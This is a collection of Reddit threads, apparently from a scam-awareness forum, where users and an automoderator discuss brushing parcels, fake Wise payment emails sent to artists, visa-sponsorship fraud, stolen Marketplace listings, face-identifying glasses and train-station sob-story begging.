Body: So a few months ago I got a Walmart envelope with a cheap plastic cup i never ordered.  I looked into it as best i could, and thought it was some scam where someone is making fake reviews using my address.  Ok, I guess i can't do anything about that.  Well, I just received a heavy trampoline from FedEx which I never ordered.  I have FedEx coming to pick it back up, I want to believe this was just sent in error, but I'm thinking it's definitely some type of scam.  I checked my credit cards, and online accounts, and I'm not seeing any false purchases.  On the FedEx label the 'From' is the Trampoline manufacturer, I can't find any customer service number for them that I can call.  There is a phone number on the FedEx label, but searching that number online comes up with complaints about scammers.  What should i be doing here?

  
So it turns out this is for a neighbor who moved here a few month's ago, a family member shipped it to him but didn't have the correct address.  His name is in the 'To' field, but it also had '\&amp;' which raises some of my alarms.  He mentioned where he lives, and his name does come up as the new homeowner when i search the address online.

- Not much you can do for !brushing scams. Sending it back is fine but may result it it going to some other unsuspecting stanger. Overseas brushing scams will often make use of a random address for returns because a return address is required by the platform and either the seller does not want to acknowledge they are drop shipping, or they don't want to pay returns to where it originated.
- I can understand the cup, that's like pennies, but the trampoline is a few hundred dollars at least.  What is the intention here?
- Hi /u/Jaded-Moose983, AutoModerator has been summoned to explain the Brushing or Direct shipping scam.

The scammer is creating and shipping out fake orders in order to both boost order numbers and place false verified reviews. [Here](https://en.wikipedia.org/wiki/Brushing) is the Wikipedia page that explains brushing, and [here](https://www.forbes.com/sites/wadeshepard/2017/11/27/americans-are-receiving-unordered-parcels-from-chinese-e-criminals-and-cant-do-anything-about-it/#dc1df7c73daa) is a news article from Forbes about the scheme. Receiving packages as part of brushing doesn't mean that your private information is compromised, if the items are relatively inexpensive.

If instead you received an expensive item, such as electronics or something like that, your account may be compromised. Log into your account and see if there are orders under your name. A scammer that has access to your account would instead be using your credit card, or a stolen credit card to purchase things in your name and ship them, and then have a porch thief pick them up from your door.

For example, when Amazon accounts are compromised, orders can be archived by the thieves to hide their tracks. Go to https://amazon.com/gp/your-account/order-history?orderFilter=archived to find any of those. If that list is clean, it means that this order didn't originate through your account.

- To create credibility. It could be a new store who wants to appear as though they have sales. The cost to "make" is less than the cost to a buyer so they may feel it's a investment worth making.

- My partner is an aesthetician in a salon. Swears light therapy is a thing that works. I don't buy it at all. But my brother in Christ I think the correct answer is to just let her have her silly light device if she thinks it works and it makes her happy. We don't have to be right on this one.
- Quick Google search seems to suggest the answer is "yes" with a maybe, or "no" with a but...

https://en.m.wikipedia.org/wiki/Light-emitting_diode_therapy

I didn't read the entire thing. Like a lot of things, it's probably true that in some forms and with proper application, it can work. But on the other hand, there's a strong possibility somebody just tossed some LEDs in a plastic shell, charged money for it, and pocketed the money.

I don't know enough about it to say one way or the other, but I agree with the other comment. If your partner likes it and feels good about it (and it wasn't outrageously expensive), maybe sit this one out.
- Eh, I don't know if I'd call this an outright scam, at least not in the sense that is usually posted in this sub.

Dubious health and beauty products have been a thing ever since people started trying to look and feel better.  Thousands, if not millions, of various pills, potions, and gadgets have come and gone over the centuries.  The whole term "snake oil" refers to this type of product.

Most of the time they don't actually do anything tangible, and rely on the placebo effect to make people feel like they didn't waste their money.
- Modern day snake oil.
- Yes, it does something. Placebo effect has been proven to be real. And since the desired effect seems to be about self image and insecurity, it's even more likely that it does something. Of course the thing about placebo is that it's supposed to be dirt cheap.

Red Light Therapy isn't the same as looking at a computer screen since it's specifically about the light being red. There have been some flawed studies that support the idea that it works, and as far as I know none that conclusively disprove or prove it, yet.
- Absolutely nothing. LED light doesn't penetrate the skin.
- The better question is why do you feel you need to be right about something that is basically none of your business?
- National Library of Medicine in Bethesda, Md has some research articles.  Hard to differentiate LED from led.   Maybe you'll have more success.  One of my kids got some sort of light therapy for high bilirubin levels shortly after birth. 

[https://vsearch.nlm.nih.gov/vivisimo/cgi-bin/query-meta?query=led+light+therapy&v%3Aproject=nlm-main-website](https://vsearch.nlm.nih.gov/vivisimo/cgi-bin/query-meta?query=led+light+therapy&v%3Aproject=nlm-main-website)
- I think maybe a good one works a little  but this looks cheap ü§∑‚Äç‚ôÄÔ∏è
- Why does christ have to do with this?
- Let's hope she's funny!
- [deleted]
- To add to this excellent post as someone who has just celebrated 32 years of marriage. This is the way. This is not a hill worth dying on.
- THINK‚Ä¶ about the quiet time you will get.
- Yea my grandma was happy about sending money to save Prince Charles when he emailed her asking for help. She was just overjoyed with the thought that HE emailed HER of all people! Of course we all tried to tell her that it was a scam but I guess its ok if the victim is happy about it. Glad we were able to clear that up.
- Even jesus bought one for Mary Magdelene
- To add to this, certain wavelengths of light have shown promise in a number of use cases in clinical studies.  And some are actually in use.  Light therapy is a thing.

For example, a 15 minute dose of a specific wavelength of near infrared light first thing in the morning has shown promise in preventing age-related macular degeneration in human eyes.  There's also some evidence that 620‚Äì750 nm red light can help increase fibroblasts, the cells that produce collagen in the skin, thus reducing lines/wrinkles/etc.  While blue light (450‚Äì495 nm) may help kill certain bacteria that can contribute to acne.

So it's not impossible.  That said, the quality of the mask and specific wavelengths are critical.  But as said above, if it makes your partner happy, fine.  Commenting and complimenting her might make her even happier.
- What about those blood oxygen saturation thingies, the ones they clip to your index finger at hospitals? they use a LED (Pulse Oximeters).

Pulse oximetry uses LED light to measure oxygen saturation. Light beams go through your finger into a light detector on the other side of the pulse oximeter. Some of the light beams will make it through the finger, while others will absorb into the finger.
- I could ask you the same.
- If you recognize that you're being rude then change what you say,  don't hide behind your diagnosis and pretend we can't call you out on it

Edit:I'm guessing they blocked me because I can't see the comment anymore. Ironic coming from someone with their profile tag line
- As long as it doesn't claim to protect against Covid and doesn't emit ultraviolet light.
- Now there's a one-sentence portrait of a marriage going south.
- Look man, go ahead and fight with your wife or whatever over this $30 thing if the money or even the principle of it is that important to you. Just giving feedback since it was asked.
- The part that ticks my bs detector is you turn it on and it literally has an rgb effect youd see on a gaming computer ie shifting through every color of the spectrum. From what i can tell that is not how light therapy works. Im also doubtful that these leds are actually hitting those specific light frequencies. Screams scam in my book, but judging on the negative feedback on this post a little scam is ok here.
- Yeah, it's like Elon's cronies blaming autism for his Nau salute.
- I always sound rude because that‚Äôs how people take it. I love how everybody downvoted it because I spoke the truth. Do you see how that worked?! Because I spoke straightforward and everybody down voted it. People don‚Äôt like it when you talk straightforward it‚Äôs not being rude. I said that as a disclaimer because people assume I‚Äôm being rude when I just speak straight. I have lots of people who tell me that I sound rude and have ever since I was a kid. It is literally the tone of my voice. It is literally how I speak as an autistic person. I do not sugarcoat shit, and I will not mask myself to appease you.
- Research more credible ones.  If they're not overly expensive, surprise your partner!

- File a police report and dispute any unauthorized charges. Probably will want to freeze your credit as well. Doesn't matter if the guy you are dealing with was scammed or not, he's the guy who took your info and money. It's up to him to prove that he's being scammed by someone else, not you. He could be the scammer and is just trying to convince you otherwise.
- What‚Äôs your complaint ?
- >when i reconnected with a moroccan acquaintance from uni who said he's been sponsored here and he can get me sponsored too for a price ofc 

The UK has very strict law on who can legally provide immigration advice and services; and they don't fuck around on enforcing penalties for those who violate that legislation.

I'm going to assume this guy was not IAA licensed 

https://www.gov.uk/government/organisations/immigration-advice-authority/about

It's a shame this kind of scam still happens, despite a system set up to protect people from exactly this kind of scenario.
- Will do man tomorrow morning
- Ive been scammed basically and im trying to retrieve my money is all so im wondering wether i should speak to a lawyer or just take it to the police
- It is a shame man 
The thing is when he sent me my certificate of sponsorship i checked online in the official uk website and found the company and it was active and everything seems legit
- What you think i should do tho ?
- Of course you were scammed and your money is gone. Did you go to the police ?
- >The thing is when he sent me my certificate of sponsorship i checked online in the official uk website and found the company and it was active and everything seems legit

Which was legit the company you'd allegedly be working for, or the agency he's provding immigration advice via? He could pick any real, existing company to fake sponsorship paperwork from.

You should report him, if you don't want to fess up to potentially iffy immigration shenanigans yourself, you can do so anonymously. 

https://www.imsallegations.homeoffice.gov.uk/

They might kick it down to general frauds investigation, but worth a try. Generally the government do come down hard on people doing this kind of shit, especially outside the licensing system, let alone outright fake paperwork.

Remember moving forward that you need to work with licensed immigration advisors and services for legitimate immigration help, and don't take their word for it on being licensed. Double-check with the IAA if you're suspicious.
- Not yet, that's the thing cause the person that got me into this is still replying to me and telling me how he was scammed aswell showing me proof and what not but the reason why i havent gone to the police is that im waiting on a lawyer's call tonight which will guide me towards the right path u could say
- Your we‚Äôre scammed, call the police on your case. Your friends case Isn‚Äôt yours.  Whose lawyer is this ?
- A family lawyer he's my uncle's lawyer basically based in london

Title: Great, now we have to worry about "dox glasses"
Body: I listened to a podcast episode (linked below) by NPR's Endless Thread. The gist of it is that a group of Harvard students have created glasses that, paired with an app, can identify strangers in about \~15 minutes. 

The real world example they gave was when the glasses identified someone waiting at a subway stop. The software program matched the straphanger's image (taken by the dox glasses) with images on search engines. Once a match was made and the subject's name was known, the software then relayed other information like employment data, relatives, known addresses, etc. In this example, the glasses-wearer approached the straphanger (an author) and said something along the lines of, "Are you so-and-so? I recognize you because I've read some of your work online." 

This subway meet-cute was an innocuous exchange but immediately alarm bells went off in my head about the scam potential these glasses could deliver. The Endless Thread hosts mentioned privacy concerns but frustratingly didn't discuss scams. The scenarios are endless. Can't you see someone approaching a elderly grandparent saying, "Are you Mildred Miller? Your grandson, Theo, has been kidnapped and we need $10,000 in bitcoin for his release. You'll receive a phone call in 2 minutes with further instructions."

Stay safe out there, friends.

- There's a reason I am starting to hate people and want to just stay at home...
- I can see someone doing that now. Every new technological advance has lead to a greater ability of people to prey on the technologically unsophisticated. But people have adapted, and society will adapt to this, too.

The greatest protection that the average person has *ever* had is that most people simply don't care who they are, or what they do. It's basically the privacy equivalent of herd immunity.
- I would argue that meet-cute is not actually an innocuous scenario! If you strike up a conversation in public, admit that you and your creep glasses looked the person up, don‚Äôt lie about being familiar with their work!
- Old news. And it‚Äôs a dumb scenario. All scammers need to do is call at random - since they‚Äôre in an African country on the other side of the world they‚Äôd  hardly want to see the scammers in person.
- You can also take a photo of someone on your phone and use the same image search engines to potentially identify them. I‚Äôm not a super spy. Someone knowing my name isn‚Äôt going to affect me.

I respond to scam scripts that use my real name the same way I respond to the same scam scripts that don‚Äôt use my name. Still a scam, either way.
- This will lead to many more dead / s.a. women.
- It's Watch Dogs in real life
- Might well prove an abject failure like Google Glass camera spectacles.
- Seriously, if someone is pulling this kind of scam INSIDE the US in person, they‚Äôre much more likely to face actual legal consequences. Especially if everybody starts wearing the ‚Äúdox glasses‚Äù, right?
- I agree that calling someone from a foreign country significantly reduces the risk of legal trouble for the scammer. But approaching the mark in person has to improve the odds of the scam succeeding, no? It gives the victim a feeling of, ‚Äúoh, this could be real ‚Äì the person actually knows me.‚Äù After the initial in ‚Äì person contact is made, the follow-up phone call can come from a person abroad.
- Fair points. But would you respond to an in-person scam that uses your real name the same way you‚Äôd respond to a phone call scam that uses your real name? I feel like the former would have a better chance of tricking most people.
- Perhaps. But it's immensely riskier for the scammer. A lot of people are suspicious/nervous about a random stranger approaching them, especially when they're alone. If the scammer impersonated a law enforcement officer, whew, they'd be in double big trouble.

Gullible people, which are ideal targets, generally seem pretty trusting about an unexpected phonecall or text anyway. Since crypto and pig butchering scams are phenomenally lucrative, there's not much need for IRL scamming, unless their goal is kidnapping or something like that.
- Well, with my experience and background, yes, I‚Äôd still be suspicious, especially if someone I don‚Äôt know says ‚ÄúHey, Bob!‚Äù instead of just ‚ÄúHey you!‚Äù I can tell when someone is trying to ‚Äúsell‚Äù me something.

However, I fear for these generations born with smart phones and tablets shoved in their faces, and turning off most if not all critical thinking processes because the information is provided to them without effort, and they take it all at face value.

The ‚ÄúKids are dumber now!‚Äù has long been a lament of countless past generations but, academic performance, especially in America, is rapidly declining.

https://www.rutgers.edu/news/smartphones-are-lowering-students-grades-study-finds

It‚Äôs not the devices or the Internet alone that are making people check out mentally. It‚Äôs actual behavioral changes, combined with lowered standards that push kids through the system than work with and mentor them.

And a majority of Americans voted for a man who wants to close the Department of Education, says he loves the ‚Äúpoorly educated‚Äù and also says that Americans are too dumb to do American jobs and need to be replaced by cheap, exploitable immigrant labor.

So, sadly, there are many vulnerable people, and they are vulnerable to these scams through willing and intentional apathy, lack of critical thinking, and greed.

Title: Same listing, different sellers?
Body: I've been looking for a recliner on Facebook marketplace, and I've seen this person's (Ahmad's) post multiple times, however when I went to see if anything new had been posted, I came across Luanne's posting. 

Ahmed- 
-Sold multiple items including cellphones and Ford F150, yet has no reviews. 
-His profile only has posts in Arabic, and his photos seem to be photoshopped? 
-His post with the chair has been up for 32 weeks. 

Luanne-
-Has 5-5‚ú® reviews.
-Has an "old lady‚Ñ¢Ô∏è" Facebook, including many pictures of her cats, her small dog named "Big Mac" and a post in all caps about in home euthanasia for one of her cats? 
-Made her post 7 hours ago.
-The picture she used is a screenshot of Ahmed's listing. 

The only thing that would make it non-scam is that she bought the chair from him when originally posted, and rather than take a new picture to post it herself, she posted a screenshot?? 
I thought about messaging her and asking, but if she is a scammer she could pretend she doesn't understand what I'm saying to her (because she's an older lady) or she may not understand legitimately?

My husband thinks they are both scammers, and I should report both listings. I've looked in a couple different subreddits to see if I could find someone else who has encountered something like this, but haven't found anything. 

Any ideas??

- The first rule of Facebook is that there's no such thing as a "legit" account.  Someone having an "old lady" Facebook means nothing, because one of the major scams out there is stealing people's Facebook accounts (in actuality, tricking people into handing over password reset codes for their accounts).  Scammers almost always have "legit looking" accounts.

>My husband thinks they are both scammers

Your husband is smart.

Protip when buying things on Facebook Marketplace:  In person pickup only, cash transactions only.  That will prevent 99% of all possible scams.
- I love how one listing added "Comfortable" to the title. Even if it were legit, I don't think I would buy something from someone who describes it as "Comfortable" with quotes. lol

"How would you describe those shoes?"

"Oh I would say they're pretty *"Comfortable"* shoes"
- Scammers on fb have a tendency to steal photos from other listings and reuse them, sometimes all across the country. As already stated, the main reason to use fb mkpl is to buy something from someone in your area where you can meet in person, verify the item is as described and working, and then exchange actual cash only. Anyone wanting to do otherwise is trying to scam you.
- My husband is a software engineer, so I always ask him for advice! My Dad also does some internet security thing, so I thought about asking him as well! 
Thanks!
- Right?? Why would you put it in "___" that makes it seem like you're saying it facetiously!
- I hadn't messaged either seller, so no one technically had asked for anything else! I asked here to see if anyone thought that one of them might have been real or if I should just avoid them both!
- You got a bigger and more easily reachable safety net than most people.

Educating yourself on top of that doesn't hurt, though.
- Avoid them both.

- To be honest, I've had good experiences with Samplesource (aka Shoppersvoice). I'm pretty confident they aren't a scam since I've been a member since 2014 and have gotten probably over a dozen sample boxes over the years. The samples change each time offers come around (2-4 times a year as I recall) which is why you don't see which ones are available at a given time.

For example, I've gotten coupons for $X-amount off or a full product, sample packets of shampoo, dog treats, small bottles of cleaner, etc. Sometimes there will be a regular sized item, but usually it's just small samples.

It's good that you took the time to research their terms of use. However, you have to manually check that box when signing up. Here is the form to opt out: [https://samplesource.com/unsubscribe.php](https://samplesource.com/unsubscribe.php) I put in my login info and wasn't redirected to a form, simply a message saying my request would be processed. If you're in california you can request more detailed info on what's collected - maybe that's why it was different for you? 

For what it's worth, I did opt into the additional emails in hopes of getting more samples. The 3rd party spam I've gotten from being a member has been extremely minimal, like an occasional email from P&G asking how I liked one of my samples. 

Every time you sign up for *any* website, you have to trust they use your data appropriately. There is a chance something or anything will actually be malicious or come back and bite you, or that the site will get hacked and all your data will be leaked. But I consider SS to be pretty low risk. That's just my opinion though.

Title: Art commission scam using fake Wise email.
Body: A person with a latinx name but an IG icon Arabic writing (weird thing #1) contacted me immediately after I posted some art. IG account had no posts but 130 followers. Anyway, the person says they want 4 pics of their two children (weird thing #2), and I quoted them a price. They didn't talk about what they wanted the pics to be of, but agreed to the price. I asked for half up front and they asked for my wise info, I sent them a QR code, they asked for full name and email (maybe weird, but some folks don't like QR codes). Soon after I sent the info, I get an email from Wise saying that if I want to accept the payment I need to switch to a biz account and ask them to send an additional $100 so that I can switch to the biz account. Many weird things, 1) the email was suggesting that they paid the whole price and not half up front like I asked , 2) there was a misspelling, and 3) when I checked the email it said "noreply.wise.usd@gmail.com".

Just because I was still hoping I was getting this commission, I didn't act just yet because I couldn't figure out how the scam would work, but a little search showed that I would have contacted the "buyer" telling them that the amount has to be X or I can't switch to a biz account and the buyer would've said, "just send me $100 and I'll send you the original amount plus the $100" and I would've been out $100. I was already getting red flags, but wishful thinking could've gotten me in trouble. Effing scammers doing damage to my self-confidence over here!

- !fakepayment scam and a variant of the !artist scam.
- There's no money or commission. They are just trying to get your money for them. Sorry...but you already suspected that. just block and ignore
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Artist or NFT scam.

This is a variant of the advance fee scam. The scammer will often use a stolen social media account to increase their credibility. A scammer will contact an artist, and ask to purchase one of their works of art (paintings, digital media or photos), and they will offer a generous sum of money. It can take three forms: a fake payment email (in which you're instructed to pay some fee to receive the money), a fake check (in which you're asked to forward some money elsewhere), or a fake NFT minting scam.

In this latest variant, the scammer suggests to buy the art piece in NFT form. The victim is instructed to mint the NFT in a fake minting website, which charges money for the fuel (as any NFT minting service does). The difference is, the scammers control this fake website and run away with your money. After you mint the NFT, the scammer disappears without paying for the piece.

This is a scam where a scammer impersonates a client. For the scam where a scammer impersonates an artist, call the automoderator trigger (muse).

- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Fake payment scam.

The fake payment scam occurs when someone tries to trick you into thinking that you have received a legitimate payment when no such payment has been made. The most common method they use is sending you an email meant to look like a payment confirmation. In some cases the emails will be almost indistinguishable to a legitimate email sent by the payment service. Scammers are known to also show you screenshots instead of an email. Never trust a screenshot a stranger shows you, because it is probably doctored.

Scammers [spoof](https://en.wikipedia.org/wiki/Email_spoofing) the 'from' email to match an official address, and make you think you received a legitimate email. To combat a fake payment scam, verify online payments by logging in directly to the service. Do not check your junk folder, and do not assume a payment is legitimate based on an email alone. If a payment isn't reflected on your account and the person you are dealing with insists they have sent it, call support and ask about it. [Here](https://i.imgur.com/X9xn8uw.jpg) is an image of a scammer trying to pull off a fake payment scam. There is also a variant of the fake payment scam where you will receive a legitimate but fraudulent payment.

A variant of the fake payment email is just an advance fee scam: the scammer tries to convince you that your funds are on hold, and that you have to upgrade your account by sending the scammer some money to authorize the payment. No payment processor works like this. If you think you're dealing with a scammer, you're probably right. Always trust your gut.

- Because the deposit will bounce, or it comes from a stolen account and they're using you as a money mule. In either case when they search for a culprit it's you.

Block the scammer. There's no such thing as a free lunch.
- The plan is: You give them money. That's it. All the other stuff is there to not make you see it clearly.
- This is how it basically works:

* I will send you $5000 in Monopoly money
* You send me back $3000 in real money
* You get to keep $2000 in Monopoly money as "payment"
- Remember NEVER to accept/deposit a check from a stranger.

Depending on your bank, checks can take days, weeks or even months (!) to be caught fake. Fund are only available and shown in your account due to bank laws. Know that depositing a FAKE check can not only get fees, but you risk getting your bank account closed due to check fraud. Any money you send to the scammer, you are responsible to pay back the bank.
- !fakepayment !advancefee
- Ok, thank you! That makes sense
- Or  
I send you $5000 of someone else‚Äôs money.   
You send me $3000 of your money.    
The bank takes back the $5000 from your account.
- Hi /u/YourUsernameForever, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

Its now 8 weeks since He first talked to me and today he spoke to me again. This poor fella sitting now since 8 weeks in the trainstation and not be able to go home.

Joke aside. He did not even have a Luggage or anything, just a bagpack for a guitar. And yet hes claiming he was in the local university and needs to go back home.

- This is a very old-skool scam: the one where a person flashes a roll of cash that looks like a lot and just needs a little more. 

Back in the day, scammers used to hang around ATM machines doing this. Ah, the nostalgia ...
- Preying on tourists who only see him once (well, maybe twice if they return to that same station). Unfortunately, in Europe or in North America, there are a lot of liars with sob stories, trying to get money.

What would happen if you reported him to the station management?
- This happens to me every time I visit Europe, especially Germany. (I dress obviously American.)

When they walk up to me and start asking for money, I glare nastily and walk away without a word.
- This is the oldest scam. The city I grew up in, in the US, has this lady from like the year 2000 that started asking for $0.25 for bus fare and went up to $1 over the span of 23 years
- It's a time honored device: I am old enough to remember when these folks would ask 5.000 lire or 30 francs to help buy a train/bus ticket to get home. Usually they stayed around a station until somebody got annoyed and called a police patrol who told the guy to beat it. Move to another station, repeat, then come back here in a few weeks. Basically a form of begging.
- I'm not sure about Hungary, but I know the US State Department has a program for US citizens who are stuck in a foreign country. You can go to the embassy and ask for a ticket home. Doesn't matter if you are broke, they will make sure to get you back to the USA.

Hungary might have a similar program, or might not. About ten years they had a program to entice Hungarians in other countries to move back to Hungary, so there might be something.
- I'm not nice anymore. 

"Nope"

Easy.
- When I did a Europe tour in 2000 I remember getting on my train in Amsterdam to head to Copenhagen. Just before I sat down in my seat (it was an old school train with compartments for six people to sit and face each other). I was alone, when this sweaty dude who looked just like sickboy from Trainspotting walks into the compartment and immediately asks "Do you speak english... oh thank god!" and then explains he's British and has tickets for this train but he doesn't have enough money to get his bag out of the station storage room. I stopped him and said "Oh man, let me give you all my dutch money" and he was very happy until I handed him the equivalent of about 8 cents... all of the dutch money I had left.

Near as I could tell lots of young british kids went to Amsterdam and ended up staying because they got super addicted to hard drugs. And they'd hang around the train station with various scams to support their habits.

I ended up just feeling like 100% of the people who tried to engage in conversation with him in train stations or on trains was some kind of scam artist.
- Just offer to purchase the ticket if he gives you that 100 bill.
- i've fallen for this as a child in nyc by not knowing any better, thought i was doing a good deed by helping some guy get home when he gave me the sob story

in hindsight i can't believe crackheads stoop low enough to bum money off of children, but ever since then i just don't give money to anyone
- Report him to the cops. I assume its worth his while to be doing this day in day out so he has obviously scammed a lot of people.
- Typical beggars yes

Over the years I've seen the same ones with the same sob stories, tourists fall for them I suppose.

Saddest part is that in my country you are only homeless if you want to. Social housing is available for everyone just as social security. 

Most have issues with booze (the fatties) and drugs (the skinnier ones), or both. Any money you'd give goes to alcohol or drugs.
- I had something like that when I lived in NYC.

A distraught woman approached me. She was a nanny for a family in my neighbourhood and lived in [neighbourhood at the other end of the city] and was supposed to accompany them on a trip to a theme park in NJ today, but she had been stuck on the subway and they left without her, and she didn't even have subway fare home because she was expected to be paid today.

The first time I gave her a subway token. The second time I just said no. The third time I said, "Wow, you need to get another job. This is the third time they've done this to you."
- I used to see the same guy every day in the SF BART station with the same scam.  I always wondered how he wasn't embarrassed when people like me said things like *"Short on change again today, eh?"*
- Old scam. I‚Äôd respect it more if you just ask me for money without the whole scam you‚Äôre wasting my time. 
I had one dude speak to me in a perfect british accent in the netherlands asking me money for a train ticket to schiphol so he could fly home saying he was robbed.
I gave him 10 euro.
I saw this fucker again next week he asked me again for money this time in dutch.
Im like you asshole hahahaah i respected that hustle though
- I wouldn‚Äôt call that a scam to be honest. He doesn‚Äôt promise you something in return. 

It‚Äôs more an unethical begging lol. He‚Äôs begging but is probably too shy to say he‚Äôs poor. 

It‚Äôs unfortunate it happens everywhere. When I see one I give a dollar if I have some in my pocket and move on.
- It is a sort of begging as @u/rudbeckials says. On the one hand, you like to give and do a good deed, on the other you don't want to be exploited and dominated. I therefore try to find something the beggar can do to compensate, for instance, sing a song for me or give me a blessing.
- I sure miss the days when the train system was ran by the government. Since it privatized, last time I was there, it's a toss up as to when/if you're ever going to arrive at your destination and the employees are rude AF. One trip I took recently should have taken 30 mins, took 2.5 hrs due to unscheduled track maintenance, off loading to a bus (which they didn't direct anyone to), then back onto a train that arrived 1 hr. late. I know where the REAL scam is.
- I once was making a day trip to NYC from NJ and had the same guy do this scam on both legs of my trip. He just changed what he said his destination was.
- Reminds of the guy at an airport who asks people for a few dollars because he's stuck but when I suggested to go to the embassy with him he is suddenly not interested anymore.
- Yeah, I gave some guy $20 in a foreign airport once because he had some story about needing a ticket. I was pretty sure it was a scam, but the story worked on me.
- Encountered this in Amsterdam.   Buying a train ticket at the airport to get to the city.   Guy comes up to me says he‚Äôs a little short can I help out.  Said no and turned away.
- I had this happen on a Metro North train in Grand Central Station in the early 90s. Guy walking down the train needing a few bucks to pay for his ticket home because he lost his monthly pass. Sorry bud I‚Äôm a poor college student. About a month later I‚Äôm in the Port Authority bus terminal getting a bus ticket to go home. Same guy comes down the line needing just a few bucks to buy a bus ticket to get home because he list his monthly pass. Same story from me, sorry I‚Äôm a poor college student.
- It's crazy but I think it works with people who have money that see someone who also usually has money but is in a jam, they feel more comradery than they do with the poors... I remember there was a guy at the target where I live riding around on a one wheel (they had just come out at this point) playing on a djembe saying he needed $1300 because somebody stole his guitar. More people were giving him money than the homeless vet by the street which I think it bananas. I've had things stolen from me but would never go around asking strangers to make me whole again.
- Exactly, report him to the security guard/police.

I'm curious to see what happens if OP goes to the ticket counter with a physical employee and offers to pay for the extra 20 euros for his ticket to Budapest....
- They dont care.
As long he is not violent or anything like that.
I did it 2 weeks ago and they said they check out for that person. Since he is still here I guess their effort was limited.
- I don‚Äôt give beggars money. You can work for it.
- Any stranger approaching you in public in a non-English-speaking country and immediately trying to talk to you in English is trying to get your money. Best case scenario is they're a beggar. Often they're a distraction for the pickpocket behind you.
- Well. In the end Tourists are the easiest target i guess.
- > I dress obviously American.

A stars and stripes shirt and a cowboy hat?
- This is how you do it. You‚Äôd be surprised just how far a nasty look can get you.
- Inflation affects scammers, too.
- Well. Tickets get more expensive over the years i guess.
- When I was in the army, a guy would run around the company area asking everyone for a nickel. Most people would give him their pocket change. Then later you'd see him at Mickey D's having lunch. Probably not a scam since we all knew about it.
- If I had more time and not only 7minutes to get to the next train I maybe report him again.

Since Im Travelling with deutsche Bahn the chances are good my train will be delayed.
- I mean I have no Idea about that but I am Pretty sure he don't plan to go to Hungary at all.

Like I mentioned I got already 8 weeks talked to in the same train station with the same story. Im not gpod with face recognition but I remembered back then already its weird to travel through Europe with nothing more than a Guitar. 

Back then I just thought Its right before christmas and a beggar was hoping for some easy money with that story and good will of people. But this year he talked to me already twice now. So I guess he do it more common on a daily/weekly base.
- US embassies do that, but they do try to contact relatives and friends to buy you a ticket. Only as a last resort will they loan, not give, you the money to get a ticket.
- This is a common scam
- The guy wasn't trying to go anywhere. He's a thief who steals with his tongue.
- Dude is not from Hungary and has no plans to buy any tickets.

I've been approached by a guy who told me his sob story about just getting out of prison, zero money or belongings, but he has an aunt in a nearby town who has a farm and will take him in, so please can you give a couple eur for a bus ticket.

I've seen him several times, been approached by him (with the exact same story) twice.
- Now its not that easy anymore since most of Europe using the Euro as currenty.
- They'll just refund it immediately.
- Some scams DO want you to buy stuff so it doesn't look/sound like begging - especially baby formula and other stuff for little kids for obvious reasons. As soon as you are gone, refund.
- Well the Ticket costs around 150‚Ç¨. I checked online out of curiosity.
- I know that feeling. 2018 i was on an Asia Trip with my Girlfriend back then and in Malaysia a woman and a maybe 10 year old kid stopped me and asked for money bcs an ATM ate their card and since it was Evening she couldnt get anyone from the bank.

Aske for money to go back to her hotel but come tomorrow to a place of my choosing to give it back. Well... Lets say It was the first and last time I believed talking from a stranger. 

The saddest part was she teaching the next generation how to scam people out of Money. I felt more sad for that kid after that.
- Im pretty sure hes not talking to others while cops are nearby.

And I dont allways have the time to search them or go to the Station Personal, when the trains are on time. Tgen I have only 7minutes.

And I did it once at the Information terminal and they dont really seemed to be interested.
- They are not poor. They are looking for a sucker to get free money.
- I remember reading about a social experiment that someone did.

He stood next to a crappy old car and asked passersby for change for the parking meter. Hardly anyone helped.

Then he stood next to an nice expensive car, and got much better results.
- Yeah, I'm fine with giving someone a couple of bucks - I do that almost every day in my neighborhood. If any of the local people are lying about their difficult circumstances, I'm willing to risk a few dollars. 

But someone asking for $20 to add to his stash is so obviously spinning a line.
- That wouldnt help anything. He takes the ticket and goes to the Help desk afterwards.

As long the travel didnt started, he can refund his ticket in the First 2 hours. Just need to say he wanted to go somewhere else, made a stupid typo and want his money back for the ticket.
- Well, you tried
- Oh, absolutely yes.
- They are less likely to be encountered again.
- And maybe feel sympathy that it could happen to them or something.
- Baggy jeans, ratty sneakers, wrinkled t-shirt, sportsball cap.
- (currently writing a note reminding me to try this in Europe someday)
- Obese with a burger in one hand?
- an m4 and bubblegum
- Plus Bermuda shorts and a huge camera hanging from the neck.
- Right. It's just a "poor me" story to get people to give him money. He could have hitch-hiked there by now, probably.
- That mofo is probably making 50E an hour with that scam
- Yes but.  If you had a list of resources on a sheet of paper you could just hand it to him ‚Äî I sympathize with your plight.  Here are some resources to help you get home!  By the third time, I guarantee he will recognize you!
- Was gonna say, my fianc√© got stuck in Bermuda about a year ago when he got kicked off a cruise we were on.. he didn‚Äôt have a passport to get home and they didn‚Äôt help him too much at the embassy there.
- Oh yes, we get them on the highway exits in the US -- "Stranded, need money for ticket home." But OP might feel better knowing that some countries provide such resources, lessening the leverage of guilt.
- I definitely would have preferred that! On that trip I dealt with 8 different currencies! Honestly it was not a bad strategy to beg for coins at the train station next to trains leaving the country.
- What if you open the stuff before giving it to them
- You should have told him to take a bus if he did not have money for the train.
- If you‚Äôre a UIUC grad, you may be familiar with Carl, who‚Äôs been trying to get to Danville for 20 years.
- It makes sense. Thank you!
- If anyone asks, not my idea

üòá
- You made spit out my fries with that one
- Neither of these things is a dress.
- He's been at it for 8 weeks. He could have walked home by now. He'd only have to walk around 20 km/day.
- People either 

a) want to help

b) ignore

c) are being dicks

No combination of a) and c)
- The Joke is you can travel through whole germany with buses and regional trains for 58‚Ç¨ per month thanks to government funding.

So you wouldnt really safe anything on it
- Omg hahaha üòÇ
- Well yeah. I was making a joke. Wait, are you saying you were being serious in your comment?
- Next scam: Need new shoes
- Next scam: need new socks.
